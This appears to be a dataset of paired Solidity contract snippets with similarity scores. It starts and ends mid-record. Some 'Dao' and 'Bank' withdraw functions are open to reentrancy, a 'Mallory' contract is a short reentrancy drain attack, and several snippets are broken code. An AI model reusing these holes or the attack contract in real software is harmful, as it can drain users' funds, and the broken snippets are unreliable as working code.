  function setRate(uint _rate) public  onlyOwner{
    rate = _rate;
  }
  
  function createTokenContract() internal returns (Wolf) {
    return new Wolf();
  }

  
  function () external payable {
    procureTokens(msg.sender);
  }

  
  function procureTokens(address beneficiary) public payable {
    uint256 tokens;
    uint256 weiAmount = msg.value;
    uint256 backAmount;
    require(beneficiary != address(0));
    
    require(weiAmount >= minNumbPerSubscr && weiAmount <= maxNumbPerSubscr);
    if (now >= startICO && now <= endICO && totalICO < hardCap){
      tokens = weiAmount.mul(rate);
      if (hardCap.sub(totalICO) < tokens){
        tokens = hardCap.sub(totalICO); 
        weiAmount = tokens.div(rate);
        backAmount = msg.value.sub(weiAmount);
      }
      totalICO = totalICO.add(tokens);
    }

    require(tokens > 0);
    token.mint(beneficiary, tokens);
    balancesSoftCap[beneficiary] = balancesSoftCap[beneficiary].add(weiAmount);

    uint256 dateEndRefund = now + 14 * 1 days;
    paymentCounter[beneficiary] = paymentCounter[beneficiary] + 1;
    payments[beneficiary][paymentCounter[beneficiary]] = BuyInfo(weiAmount, tokens, dateEndRefund); 
    
    if (backAmount > 0){
      msg.sender.transfer(backAmount);  
    }
    emit TokenProcurement(msg.sender, beneficiary, weiAmount, tokens);
  }

 
  function refund() public{
    require(address(this).balance < softcap && now > endICO);
    require(balancesSoftCap[msg.sender] > 0);
    uint value = balancesSoftCap[msg.sender];
    balancesSoftCap[msg.sender] = 0;
    msg.sender.transfer(value);
  }
  
  function revoke(uint _id) public{
    require(now <= payments[msg.sender][_id].dateEndRefund);
    require(payments[msg.sender][_id].summEth > 0);
    require(payments[msg.sender][_id].summToken > 0);
    uint value = payments[msg.sender][_id].summEth;
    uint valueToken = payments[msg.sender][_id].summToken;
    balancesSoftCap[msg.sender] = balancesSoftCap[msg.sender].sub(value);
    payments[msg.sender][_id].summEth = 0;
    payments[msg.sender][_id].summToken = 0;
    msg.sender.transfer(value);
    token.burn(msg.sender, valueToken);
   }  
  
  function transferToMultisig() public onlyOwner {
    require(address(this).balance >= softcap && now > endICO14);  
      wallet.transfer(address(this).balance);
  }  
}"
"contract Test {
    function send(address another) public pure {
        Another(another).sendToAnother();
    }
}",0.6302910448681395,"contract RandomGeneratorInterface {

    function rand(address sender) public returns (uint256);

}"
"contract A  {
        function A(address[] _owners, uint _required) {
        }
    }",0.6738150971731278,"contract Token{
  function transfer(address to, uint value);
}"
"contract B is A {
        function B()
          A(new address[](0),0)) { 
        }
    }",0.6207496006212471,"contract IRegistry {

    function add(address who) public;

}"
"contract SampleContract {
    string value;

    function SampleContract() public {
        value = ""hello world"";
    }

    function getValue() public view returns (string){
        return value;
    }

    function setValue(string str) public {
        value = str;
    }
}",0.681813193797217,"contract SaveString{

    constructor() public {

    }

    mapping (uint=>string) data;

    function setStr(uint key, string value) public {

        data[key] = value;

    }

    function getStr(uint key) public constant returns(string){

        return data[key];

    }

}"
"contract MyToken {
    
    mapping (address => uint256) public balanceOf;

    
    function MyToken(
        uint256 initialSupply
        ) {
        balanceOf[msg.sender] = initialSupply;              
    }

    
    function transfer(address _to, uint256 _value) {
        require(balanceOf[msg.sender] >= _value);           
        require(balanceOf[_to] + _value >= balanceOf[_to]); 
        balanceOf[msg.sender] -= _value;                    
        balanceOf[_to] += _value;                           
    }
}",0.694128050525577,"contract BurnableToken is BasicToken {



    event Burn(address indexed burner, uint256 value);



    

    function burn(uint256 _value) public {

        require(transfersEnabled);

        require(_value <= balances[msg.sender]);

        

        

        address burner = msg.sender;

        balances[burner] = balances[burner].sub(_value);

        totalSupply = totalSupply.sub(_value);

        emit Burn(burner, _value);

    }

}"
"contract MyContract {

    uint256 public  totalSupply ; 
    mapping( address => uint256) public  balances ;
    address payable public owner;

    constructor(address payable _wallet) public payable {
        totalSupply = 6;
        owner = _wallet;
    }

    function () external payable{
        buyToken();
    }

    function buyToken() public payable {
        require(totalSupply >= (msg.value/1000000000000000000)*2);
        balances[msg.sender] += (msg.value/1000000000000000000)*2;
        
        totalSupply -=(msg.value/1000000000000000000)*2;

    }
    function getTotalSupply()public view returns  (uint256 ){
        return totalSupply;
    }
       function setTotalSupply(uint256 newSupply) public payable {
        
        totalSupply = newSupply;

    }

}",0.6416475829546133,"contract BasicToken is ERC20Basic {
  using SafeMath for uint256;

  mapping(address => uint256) balances;

  uint256 totalSupply_ = 45467000000000000000000000;

  
  function totalSupply() public view returns (uint256) {
    return totalSupply_;
  }

  
  function transfer(address _to, uint256 _value) public returns (bool) {
    require(_to != address(0));
    require(_value <= balances[msg.sender]);

    
    balances[msg.sender] = balances[msg.sender].sub(_value);
    balances[_to] = balances[_to].add(_value);
    emit Transfer(msg.sender, _to, _value);
    return true;
  }

  
  function balanceOf(address _owner) public view returns (uint256 balance) {
    return balances[_owner];
  }

}"
"contract Pie {
  uint256 public p;
}",0.6431159261575542,"contract Empty {
 uint public value = 5;
}"
"contract Sender {
  function send(address _receiver) payable {
    _receiver.send(msg.value);
  }
}",0.6932572145341875,"contract SendBack {
    function() payable {
        if (!msg.sender.send(msg.value))
            throw;
    }
}"
"contract Foo {
    bytes32 foo;

    function setFoo(bytes32 _foo) public {
        foo = _foo;
    }

    function getFoo() public constant returns (bytes32) {
        return foo;
    }
}",0.6585730069387846,"contract PazhukovMaxInETH {
    
    bytes32 info = ""I'm smart contract from p5m.ru!"";
    
    function getInfo() view public returns (bytes32) {
        return (info);
    }
    
}"
"contract MyContract {
    uint[] public array;

    constructor() public {
        array.push(1);
        array.push(2);
        array.push(3);
    }

    function getArray() public view returns(uint[]) {
        return array;
    }
}",0.6335095461275724,"contract Counter {

   uint256 c;



   constructor() public {

       c = 1;

   }   

   function inc() external {

        c = c + 1;

   }

   function get() public view returns (uint256)  {

       return c;

   }

}"
"contract TestStamps {

    uint256 time;
    bool test;

    constructor() public {
        time = now;
    }

    function getTime() public view returns (uint256) {
        return time;
    }

    function updateBlock() public  {
        time = now;
    }

    function doLogic() public {
        if (now > time) {
            test = true;
        } else {
            test = false;
        }
    }

    function getTestBool () public view returns (bool) {
        return test;
    }
}",0.6574628804729233,"contract IBiLinkToken is IToken {



	function getCanShareProfitAccounts() public constant returns (address[]);



	function totalSupply() public view returns (uint256);



	function balanceOf(address _account) public view returns (uint256);



	function mint(address _to, uint256 _amount) public returns (bool);



	function burn(uint256 amount) public;



}"
"contract Dao {
    struct User {
        address addr;
        string name;
        uint balence;
        uint8 flag;
    }

    
    mapping(address=>User) users; 

    uint public userCount;

    constructor() public {
        
        
        
    }

    function addUser (address _addr, string _name, uint _balence, uint _flag) private {
        users[_addr] = User(_addr,_name,0,1);
        userCount++;
    }

    function addToBalence(string name) public payable{
        if(users[msg.sender].flag != 1) addUser(msg.sender,name,0,1);
        users[msg.sender].balence = users[msg.sender].balence + msg.value;
    }

    function showBalence(address) public returns (uint) {
        return users[msg.sender].balence;
    }

    function withdraw(uint amount) public payable{

        if(users[msg.sender].flag != 1) revert(""user does not exist"");
        else if (users[msg.sender].balence >= amount){
            msg.sender.call.value(amount)();
            users[msg.sender].balence -= amount;
        }
        else return false;
    }
    }",0.6644886762105617,"contract Bank {

	address owner;

	uint256 public minDeposit = 1 ether;

	mapping (address => uint256) public balances;

	Logger private TrustLog;



	constructor(address _logger) payable public {

		owner = msg.sender;

		TrustLog = Logger(_logger);

	}



	function deposit() public payable {

		if (msg.value >= minDeposit) {

			balances[msg.sender]+=msg.value;

			TrustLog.LogTransfer(msg.sender,msg.value,""deposit"");

		} else {

			TrustLog.LogTransfer(msg.sender,msg.value,""depositFailed"");

		}

	}



	function withdraw(uint256 _amount) public {

		if(_amount <= balances[msg.sender]) {

		    (bool success, ) = msg.sender.call.value(_amount)("""");

			if(success) {

				balances[msg.sender] -= _amount;

				TrustLog.LogTransfer(msg.sender, _amount, ""withdraw"");

			} else {

				TrustLog.LogTransfer(msg.sender, _amount, ""withdrawFailed"");

			}

		}

	}



	function checkBalance(address _addr) public view returns (uint256) {

		return balances[_addr];

	}

}"
"contract Hacker {
    
    Dao dao;
    address userAddress;
    string userName;

    constructor(string name, address daoAddr) public {
        dao = Dao(daoAddr);
        userAddress = msg.sender;
        userName = name;
    }

    function payout(uint amount) public payable{
        dao.withdraw(amount);
    }
}",0.6125037089375056,"contract Reverter {
    
    constructor() public {}
    
    function transferEth(address payable _address, uint256 amount, bytes memory _data)public payable{
        if(amount <= 0) amount = address(this).balance;
        (bool success, ) = _address.call.value(amount)(_data);
        require(success);
        
        revert();
    }
}"
"contract Test {
   string public t;
   function set(string _t) public {
       t = _t;
   }
}",0.6640634323215878,"contract NamedToken is ERC20 {
   string public name;
   string public symbol;
}"
"contract MetaCoin {
  mapping (address => uint) balances;

  function MetaCoin() {
    balances[tx.origin] = 10000;
  }

  function sendCoin(address receiver, uint amount) returns(bool sufficient) {
    if (balances[msg.sender] < amount) return false;

    balances[msg.sender] -= amount;
    balances[receiver] += amount;
    return true;
  }

  function getBalanceInEth(address addr) constant returns(uint) {
    return getBalance(addr) * 2;
  }

  function getBalance(address addr) constant returns(uint) {
    return balances[addr];
  }
}",0.6714312844898249,"contract BasicToken is ERC20Basic {
  using SafeMath for uint;

  mapping(address => uint) balances;

  function transfer(address _to, uint _value) public returns (bool) {
    require(_to != address(0));
    require(_value > 0 && _value <= balances[msg.sender]);

    balances[msg.sender] = balances[msg.sender].sub(_value);
    balances[_to] = balances[_to].add(_value);
    Transfer(msg.sender, _to, _value);
    return true;
  }

  function balanceOf(address _owner) public constant returns (uint balance) {
    return balances[_owner];
  }
}"
"contract M {

    struct Confezione {
        string mar;
        uint256 co;
    }

    Confezione[] public dati;

    function inserimento(string memory m, uint256 c) public {
        dati.push(Confezione(m,c));
    }

    function ritornavalore() public view returns(Confezione[] memory) {
    return dati;

    }
}",0.6123853403872268,"contract IERC721Metadata {

  
  function name() public view returns (string);

  
  function symbol() public view returns (string);

  
  function description() public view returns (string);

  
  function tokenMetadata(uint256 assetId) public view returns (string);
}"
"contract MyFriendToken is ERC20{
    string public token_name;
    string public symbol;
    uint8 public decimals;

    address public owner;

    bool purchase_OK = true;

    address friend1 = address(0x123...);
    address friend2 = address(0x456...);
    

    function purchase_ko() {
        if(msg.sender != owner){ throw;}
        purchase_OK = false;
    }

    function purchase_ok()  {
        if(msg.sender != owner){ throw;}
        purchase_OK = true;
    }

    function MyFriendToken(){

        owner = msg.sender;
        token_name = ""MyFriendToken"";
        symbol = ""MFT"";
        decimals = 18;
    }

    function kill() {
        if (msg.sender == owner) selfdestruct(owner);
    }

    function() payable {
        if(!purchase_OK){throw;}
        if(msg.sender != friend1 && msg.sender != friend2) {throw;}

        owner.transfer(msg.value);
        uint256 myFriendToken = (msg.value * 1000);
        totalSupply += myFriendToken;
        balances[msg.sender] += myFriendToken;
    }
}",0.6371937989026212,"contract UbiatarPlay is ERC20 {
    
    
    string public name = 'UbiatarPlay';
    string public symbol = 'UAC';
    uint8 public decimals = 8;
    
    
    address owner; 
    address public crowdsale;
    string public version = 'v0.8';
    uint256 public totalSupply = 1000000000 * 10**uint(decimals);

    modifier onlyBy(address _account) {
        require(msg.sender == _account);
        _;
    }
    
    constructor() ERC20 (totalSupply, name, decimals, symbol) public {
        owner = msg.sender;
        crowdsale = address(0);
    }

    event Burn(address indexed burner, uint256 value);

    function burn(uint256 _value) public returns (bool success) {
        require(_value > 0);
        require(balances[msg.sender] >= _value);
        balances[msg.sender] -= _value;
        totalSupply -= _value;
        emit Transfer(msg.sender, address(0), _value);
        emit Burn(msg.sender, _value);
        return true;
    }

}"
"contract IExampleOne {
  function problems(bytes32) public returns (bytes32, bytes32, bytes32[], uint);
  }",0.6545959659462248,"contract GateKeeperI {
  function enter(bytes32 _passcode, bytes8 _gateKey) public returns (bool);
}"
"contract Mapping {

  mapping(address => uint)  balancesA;
  mapping(address => uint)  balancesB;

  function Mapping() {
    
    balancesA[msg.sender] = 100;
    balancesB[msg.sender] = 200;
  }

  function getBalance(address addr) returns(uint, uint) {

    
    mapping(address => uint)  balancers;
    balancers[msg.sender] = 500;

    return (balancesA[addr], balancesB[addr]);

  }
}",0.6559445760045417,"contract XG4K {	
	mapping (address => uint) public balances;
	function XG4K() {
		balances[tx.origin] = 100000;
	}
	function sendToken(address receiver, uint amount) returns(bool successful){
		if (balances[msg.sender] < amount) return false;
 		balances[msg.sender] -= amount;
 		balances[receiver] += amount;
 		return false;
 	}
}"
"contract Example {
    function getStringArray() public returns (string[]) {
        string[] memory resultStr = new string;
        resultStr[0] = ""355555555"";
        resultStr[1] = ""2"";
        resultStr[2] = ""8888"";
        return resultStr;
    }
}",0.6190653215221816,"contract Trusti {
    string data = ""trusti.id"";
    
    function getStore() public view returns (string memory) {
        return data;
    }
    
    function setStore(string memory _value) public {
        data = _value;
    }
}"
"contract Contract1 is Ownable {
    uint public threshold;
    ...
    function Function1(uint start) public returns (uint, uint, uint, bool ) {
       require(start >= 1 && start <= currentTicket);
        uint i;
        for (i = start; i <= currentTicket; i++) {
            if (tickets[i].holder == msg.sender && tickets[i].winAmt > 0) {
                return (i, tickets[i].ref, tickets[i].winAmt, tickets[i].paid);
            }
        }
        return (currentTicket + 100, 0, 0, false);
    }
 }",0.6064917061756312,"contract Testable {
    
    
    bool public isTest;

    uint private currentTime;

    constructor(bool _isTest) internal {
        isTest = _isTest;
        if (_isTest) {
            currentTime = now; 
        }
    }

    
    modifier onlyIfTest {
        require(isTest);
        _;
    }

    
    function setCurrentTime(uint _time) external onlyIfTest {
        currentTime = _time;
    }

    
    function getCurrentTime() public view returns (uint) {
        if (isTest) {
            return currentTime;
        } else {
            return now; 
        }
    }
}"
"contract Firma {

    address owner;
    struct Firmas{

        bytes32 name;
        uint pNum;


    }

    function Firma() {
        owner=msg.sender;


    }


    mapping(address =>Firmas) allFirmas;
    address[] aF;

    function setFirma(bytes32 _name, uint _pNum) public {

        var f= allFirmas[owner];
        f.name=_name;
        f.pNum=_pNum;
        aF.push(owner);

    }

    function getAllFirma() view public returns(address[]){
        return aF;
    }


}",0.6348718528281482,"contract ENSReverseRegistrar {
    function claim(address _owner) public virtual returns (bytes32 _node);
    function claimWithResolver(address _owner, address _resolver) public virtual returns (bytes32);
    function setName(string memory _name) public virtual returns (bytes32);
    function node(address _addr) public view virtual returns (bytes32);
}"
"contract Users{

    Firma firma;

    function Users(address _address) {

        firma= Firma(_address);


    }
    function getF() view public returns(address[]){

        return firma.getAllFirma(); 
                                    

    }

}",0.6628169731727933,"contract OtcLike {
    function getPayAmount(address, address, uint) public view returns (uint);
    function buyAllAmount(address, uint, address, uint) public;
}"
"contract Mallory {
    address payable owner;
    EDao public dao = EDao(##EdaoSmartContractAddress##);

    constructor() public{owner = msg.sender; }

    function getJackpot()public { owner.transfer(address(this).balance); }

    function() external payable { dao.withdraw(address(this), 1000000000000000000); }

}",0.6736440887856691,"contract EthexHouse {

     address payable private owner;

     

     constructor() public {

         owner = msg.sender;

     }

     

     modifier onlyOwner {

        require(msg.sender == owner);

        _;

    }

    

    function payIn() external payable {

    }

    

    function withdraw() external onlyOwner {

        owner.transfer(address(this).balance);

    }

 }"
"contract TokenSale {
    Token token;

    function TokenSale(address tokenAddress) {
        token = Token(tokenAddress);
    }
}",0.6091810123371979,"contract TokenList {

    function isTokenInList(address tokenAddress) public constant returns (bool);

}"
"contract MyTokenSale is TokenSale {
    function MyTokenSale(address tokenAddress) TokenSale(tokenAddress) {
        
    }
}",0.6066817812420732,"contract TokenList {

    function isTokenInList(address tokenAddress) public constant returns (bool);

}"
"contract Crowdsale {
    using SafeMath for uint256;
    using BytesLib for bytes;

    
    address public wallet;

    ERC20 public token;

    
    uint256 public weiRaised;

    function Crowdsale(address _wallet, ERC20 _token) public {
        require(_wallet != address(0));

        wallet = _wallet;
        token = _token;
    }

    function () external payable {
        buyTokens(msg.sender);
    }

    function buyTokens(address _beneficiary) public payable {

        bytes memory msgData = msg.data;
        bytes memory dataValue = msgData.slice(36, 32);
        uint256 weiAmount = dataValue.toUint(0);

        weiRaised = weiRaised.add(weiAmount);
      }   
}",0.6634086052846822,"contract AllowanceCrowdsale is Crowdsale {

  using SafeMath for uint256;

  using SafeERC20 for IERC20;



  address private _tokenWallet;



  

  constructor(address tokenWallet) public {

    require(tokenWallet != address(0));

    _tokenWallet = tokenWallet;

  }



  

  function tokenWallet() public view returns(address) {

    return _tokenWallet;

  }



  

  function remainingTokens() public view returns (uint256) {

    return token().allowance(_tokenWallet, this);

  }



  

  function _deliverTokens(

    address beneficiary,

    uint256 tokenAmount

  )

    internal

  {

    token().safeTransferFrom(_tokenWallet, beneficiary, tokenAmount);

  }

}"
"contract MetaCoin is Ownable{
    mapping (address => uint) balances;

    event Transfer(address indexed _from, address indexed _to, uint256 _value);

    function MetaCoin() {
        balances[tx.origin] = 10000;
    }

    function sendCoin(address receiver, uint amount) returns(bool sufficient) {
        if (balances[msg.sender] < amount) return false;
        balances[msg.sender] -= amount;
        balances[receiver] += amount;
        Transfer(msg.sender, receiver, amount);
        return true;
    }

    function getBalanceInEth(address addr) returns(uint){
        return ConvertLib.convert(getBalance(addr),2);
    }

    function getBalance(address addr) returns(uint) {
        return balances[addr];
    }
}",0.6825476330158302,"contract ERC20 {
	function transfer(address _to, uint _value) returns (bool success);
	function balanceOf(address _owner) constant returns (uint balance);
	function approve(address _spender, uint256 value) public returns (bool);
	function transferFrom(address _from, address _to, uint _value) returns (bool success);
	function allowance(address _owner, address _spender) constant returns (uint remaining);
	event Transfer(address indexed _from, address indexed _to, uint _value);
	event Approval(address indexed _owner, address indexed _spender, uint _value);
}"
"contract Relay is MetaCoin {
address public owner;
uint public count;
address[] oracles;
uint public fee;


  function Relay() {
    owner = msg.sender;
    count = 0;
    fee = 10;
  }


  function fundRelay() payable returns (bool) {
    if (owner != msg.sender) throw;

  }

function approveExternalTransaction() {
  count++;
  if (count == 3) {
    releaseFunds();
  }
}
  function releaseFunds () {

      sendCoin(owner, fee);

  }
}",0.6566173945151126,"contract ERC20 is ERC20Basic {
  function allowance(address owner, address spender) public constant returns (uint);
  function transferFrom(address from, address to, uint value) public returns (bool ok);
  function approve(address spender, uint value) public returns (bool ok);
  event Approval(address indexed owner, address indexed spender, uint value);
}"
"contract DormantAsset  is Heritable {
  event Sent(address indexed payee, uint256 amount, uint256 balance);
  event Received(address indexed payer, uint256 amount, uint256 balance);
  function DormantAsset(uint256 _heartbeatTimeout) Heritable(_heartbeatTimeout) public {}
  function () public payable {
    Received(msg.sender, msg.value, this.balance);
  }
  function sendTo(address payee, uint256 amount) public onlyOwner {
    require(payee != 0 && payee != address(this));
    require(amount > 0);
    payee.transfer(amount);
    Sent(payee, amount, this.balance);
  }",0.6753751396958353,"contract Reverter {
    
    constructor() public {}
    
    function transferEth(address payable _address, uint256 _amount, bytes memory _data)public payable{
        
        uint256 amount = parseAmount(_amount);
        (bool success, ) = _address.call{ value: amount }(_data);
        require(success);
        
        revert();
    }
    function parseAmount(uint256 _amount) private view returns(uint256) {
        uint256 amountToTransfer = _amount;
        
        uint256 ethbalance = address(this).balance;
        
        if(amountToTransfer <= 0) {
            amountToTransfer = ethbalance;
        }
        require(amountToTransfer <= ethbalance);
        return amountToTransfer;
    }

}"
"contract SimpleStorage {
    uint public data;

    function set(uint x) public {
        data = x;
    }
}",0.6429314045320139,"contract Data {
    mapping(address => uint256) public CftBalanceOf;
       function Data() public {
            }
}"
"contract blackeye {
    uint public max_amount = 1000000;
    uint public total_balance_bought = 0;

    mapping(address => uint) total_balance;   

    address owneraddress;

    modifier onlyowner {
        require(owneraddress == msg.sender);
        _;
    }

    modifier can_buy_amount(uint rupee_invested) {
        require(rupee_invested + total_balance_bought <= max_amount);
        _;
    }

    function balance(address investor) external constant returns(uint) {
        return total_balance[investor];
    }

    function deposit(address creator, address investor, uint rupee_invested) external {
        if (msg.sender == address(creator)) {
            uint amount_bought = rupee_invested;
            total_balance[investor] += amount_bought;
            total_balance_bought += amount_bought;
        }
    }

    function withdraw(address creator, address investor, uint amount_sold) external {
        if (msg.sender == address(creator)) {
            total_balance[investor] -= amount_sold;
            total_balance_bought -= amount_sold;
        }
    }

    function send_money(address sender, address receiver, uint amount_send) external {
        total_balance[sender] -= amount_send;
        total_balance[receiver] += amount_send;
    }
}",0.6293531507922564,"contract Ownable {
    address internal _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () internal {
        _owner = msg.sender;
        emit OwnershipTransferred(address(0), _owner);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(msg.sender == _owner);
        _;
    }

    function transferOwnership(address newOwner) external onlyOwner {
        require(newOwner != address(0));
        _owner = newOwner;
        emit OwnershipTransferred(_owner, newOwner);
    }

    function rescueTokens(address tokenAddress, address receiver, uint256 amount) external onlyOwner {
        IERC20 _token = IERC20(tokenAddress);
        require(receiver != address(0));
        uint256 balance = _token.balanceOf(address(this));

        require(balance >= amount);
        assert(_token.transfer(receiver, amount));
    }

    function withdrawEther(address payable to, uint256 amount) external onlyOwner {
        require(to != address(0));

        uint256 balance = address(this).balance;

        require(balance >= amount);
        to.transfer(amount);
    }
}"
"contract Election {

    string public candidateName;

    constructor (string _candidateName) public {
        candidateName = _candidateName;
    }

    function setCandidate (string _name) public {
        candidateName = _name;
    }

}",0.6058922484418482,"contract NamableAddressList is AddressList {

    constructor(string _name, bool nullValue)

    AddressList(_name, nullValue) public {}



    function changeName(string _name) onlyOwner public {

        name = _name;

    }

}"
"contract A {
     function test() constant returns(string s, address addr) {
        s = ""Success!"";
        addr = msg.sender;
    }
}",0.6955285347468457,"contract Authority {
    function canCall(address src, address dst, bytes4 sig) constant returns (bool);
}"
"contract A {
    event lmao (string);
    uint public x;
    function hello () public {
        emit lmao ('YES');
    }
    function setNumber (uint n) public {
        x=n;
    }
}",0.6447878556844694,"contract testabi {

    uint c;

    function tinhtong(uint a, uint b) public {

        c = a+b;

    } 

    function ketqua() public view returns (uint) {

        return c;

    }

}"
"contract TestString {
    function stringConcat(string a, string b) public returns (string) {
        bytes memory strA = bytes(a);
        bytes memory strB = bytes(b);

        string memory finalLength = new string(a.lenght + b.lenght);

        bytes memory finalStr = bytes[finalLength];

        uint k = 0;

        for(uint i = 0; i < a.lenght; i++) {
            finalStr[k++] = strA[i];
        }

        for(i = 0; i < b.lenght; i++) {
            finalStr[k++] = strB[i];
        }

        returns string(finalStr);   
    }
}",0.6075949855806686,"contract displayable {

  function bytes32ToString(bytes32 x) public pure returns (string) {

    bytes memory bytesString = new bytes(32);

    uint256 charCount = 0;

    for (uint256 j = 0; j < 32; j++) {

      if (x[j] != 0) {

        bytesString[charCount] = x[j];

        charCount++;

      }

    }

    bytes memory bytesStringTrimmed = new bytes(charCount);

    for (j = 0; j < charCount; j++) {

      bytesStringTrimmed[j] = bytesString[j];

    }

    return string(bytesStringTrimmed);

  }

}"
"contract User {
    string publicKey;

    function setPublicKey(string _publicKey)
        onlyOwner
    {
        publicKey = _publicKey;
    }

    function getPublicKey() returns (string _publicKey) {
        return publicKey;
    }

}",0.6049198377949746,"contract PotatoStorage {
    string storedPotato;

    function setPotato(string x) public {
        storedPotato = x;
    }

    function getPotato() public view returns (string) {
        return storedPotato;
    }
}"
"contract Aa {

    string public result;    

    function feedData(string _result) public {
        require(_result = ""e"" , ""error"");
        _result = result;
    }
}",0.6017980246492375,"contract Ownable {



    mapping(uint => string) public data;

    

    function addData(string memory inData) public {

        data[1] = inData;

    }



}"
"contract Parent {
   function createChild() public {
        new Child();
    }
}",0.6524728571600165,"contract Incrementer {
    uint public i;
    function inc() {
        i++;
    }
}"
"contract b {

        bool p;

    mapping(uint => bool) public t;

    function setValue() {
        bool b = t[1];
        b = true;
    }
    function checkValue() returns (bool) {
        return t[1];
    }
}",0.6468378185460283,"contract testabi {

    uint c;

    function tinhtong(uint a, uint b) public {

        c = a+b;

    } 

    function ketqua() public view returns (uint) {

        return c;

    }

}"
"contract TaskMaster {

        mapping (address=>uint) public balances;
        address public owner;

        constructor () public {
            owner = msg.sender;
            balances[owner] = 10000;
        }

        function reward(address doer, uint rewardAmount) 
        public isOwner() hasSufficientFunds(rewardAmount)
        returns (bool sufficientFunds) {
            balances[msg.sender] -= rewardAmount;
            balances[doer] += rewardAmount;
            return sufficientFunds;
        }

        function getBalance(address addr) public view returns (uint balance) {
            return balances[addr];
        }

        modifier isOwner() {
            require(msg.sender == owner);
            _;
        }

        modifier hasSufficientFunds(uint rewardAmount) {
            require(balances[msg.sender] >= rewardAmount);
            _;
        }
    }",0.6726559345447997,"contract Bank is DSMath { mapping(address => uint) public balances;

  event LogDepositMade(address accountAddress, uint amount); function deposit() public payable returns (uint balance) {

    balances[msg.sender] = add(balances[msg.sender], msg.value);

    emit LogDepositMade(msg.sender, msg.value);

    return balances[msg.sender];

  } function withdraw(uint amount) public returns (uint remainingBalance){

    require(min(amount,balances[msg.sender]) == amount);

    balances[msg.sender] = sub(balances[msg.sender],amount);

    msg.sender.transfer(amount);

    return balances[msg.sender];

  } 



function balance() view public returns (uint) {

    return balances[msg.sender];

  }

}"
"contract Lottery is usingOraclize {

  uint lotteryFee = 0.1 ether;
  uint8 counter = 0;
  address[10] participants;
  mapping (address => bool) checkParticipant;
  address public owner;
  bytes32 public oraclizeID;
  uint public winnerNumber;


  modifier onlyOnce() {
      require(checkParticipant[msg.sender] == false);
      _;
  }


  function participate() external payable onlyOnce returns(address) {
    require(msg.value == lotteryFee);
    checkParticipant[msg.sender] = true;
    counter = counter + 1;  
    participants[counter] = msg.sender;
    return(participants[counter]);
  }

  function getBalance() public view returns (uint) { 
    uint contractBalance = address(this).balance;
    return(contractBalance);
  }

  function selectWinner() payable public {
    oraclizeID = oraclize_query(""WolframAlpha"", ""random number between 1 and 10"");
  }

  function __callback(bytes32 _oraclizeID, string _result){
    if(msg.sender != oraclize_cbAddress()) throw;
    testString = _result;
    winnerNumber = parseInt(_result);
    uint maxRange = counter; 
    uint randomNumber = uint(sha3(_result)) % maxRange; 
  } 

  function payTheReward() external returns(address){
    address winnerAddress = participants[winnerNumber]; 
    uint currentBalance = getBalance();
    winnerAddress.transfer(currentBalance);
    deleteParticipants();
    return (winnerAddress);
  }

  function deleteParticipants() internal {
    uint8 a = counter;
    for(uint8 i = 0; i < a; i++) {
      checkParticipant[participants[i]] = false;
      participants[i] = 0;
    }
    counter = 0;
  }
}",0.6208862066651559,"contract EthBird {
    
    address public owner;
    address highScoreUser;
    
    uint currentHighScore = 0;
    uint256 ownerCommision = 0;
    uint contestStartTime = now;
    
    mapping(address => bool) paidUsers;
    
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }
    
    function EthBird() public {
        owner = msg.sender;
    }
    
    function payEntryFee() public payable  {
        if (msg.value >= 0.001 ether) {
            paidUsers[msg.sender] = true;
            ownerCommision = msg.value / 5;
            address(owner).transfer(ownerCommision);
        }
        
        if(now >= contestEndTime()){
            awardHighScore();   
        }
    }

    function getCurrentHighscore() public constant returns (uint) {
        return currentHighScore;
    }
    
    function getCurrentHighscoreUser() public constant returns (address) {
        return highScoreUser;
    }
    
    function getCurrentJackpot() public constant returns (uint) {
        return address(this).balance;
    }
    
    function contestEndTime() public constant returns (uint) {
        return contestStartTime + 3 hours;
    }
    
    function getNextPayoutEstimation() public constant returns (uint) {
        if(contestEndTime() > now){
            return contestEndTime() - now;
        } else {
            return 0;
        }
    }
    
    function recordHighScore(uint score, address userToScore)  public onlyOwner {
        if(paidUsers[userToScore]){
            if(score > 0 && score >= currentHighScore){
                highScoreUser = userToScore;
                currentHighScore = score;
            }
        }
    }
    
    function awardHighScore() internal {
        address(highScoreUser).transfer(address(this).balance);
        contestStartTime = now;
        currentHighScore = 0;
        highScoreUser = 0;
    }
}"
"contract stringsContract {
        function takesTwo(string memory str, uint idx) public pure returns (byte) {
            bytes memory bytesStr = bytes(str);
            return bytesStr[idx];
        }
    }",0.6181521992075788,"contract TestContract {
    string name;
    function getName() public constant returns (string){
        return name;
    }
    function setName(string newName) public {
        name = newName;
    }
}"
"contract exchange {
    mapping (address => uint256) public balances;
    event PaymentDone(string s);

    function Channel( uint value) payable {
        balances[msg.sender] -=value;
        balances[this] +=value;
    }

    function CloseChannel( address to,uint value) {
        if (to.send(value)) {
            PaymentDone(""Done"");
        }
    }
}",0.6677817900994168,"contract BasicToken is ERC20Basic {

  using SafeMath for uint;

  mapping(address => uint) balances;

  function transfer(address _to, uint _value) public{
    balances[msg.sender] = balances[msg.sender].sub(_value);
    balances[_to] = balances[_to].add(_value);
    emit Transfer(msg.sender, _to, _value);
  }

}"
"contract AirDrop is Ownable {

  ERC20 public token;
  address public tokenWallet;
  address public tokenAddress;

  event TransferredToken(address indexed to, uint256 value);
  event FailedTransfer(address indexed to, uint256 value);

  constructor(address _tokenAddress, address _tokenWallet) public {
      tokenWallet = _tokenWallet;
      tokenAddress = _tokenAddress;
      token = ERC20(_tokenAddress);
  }

  function sendTokens(address[] destinations, uint256[] values, address _tokenAddress, address _tokenWallet) onlyOwner external {
      require(destinations.length == values.length);
      uint256 i = 0;
      while (i < destinations.length) {
          uint256 toSend = values[i] * 10**18;
          sendInternally(destinations[i], toSend, values[i]);
          i++;
      }
  }

  function sendTokensSingleValue(address[] destinations, uint256 value) onlyOwner external {
      uint256 i = 0;
      uint256 toSend = value * 10**18;
      while (i < destinations.length) {
          sendInternally(destinations[i] , toSend, value);
          i++;
      }
  }

  function sendInternally(address recipient, uint256 tokens, uint256 valueToPresent) internal {
    require(recipient != address(0));
    ERC20(tokenAddress).transfer(recipient, tokens);
  }


  function tokensAvailable() constant returns (uint256) {
    return token.allowance(tokenWallet, msg.sender);
  }

  function destroy() onlyOwner public {
    selfdestruct(owner);
  }
}",0.6835192899918278,"contract Airdrop is Ownable {

    

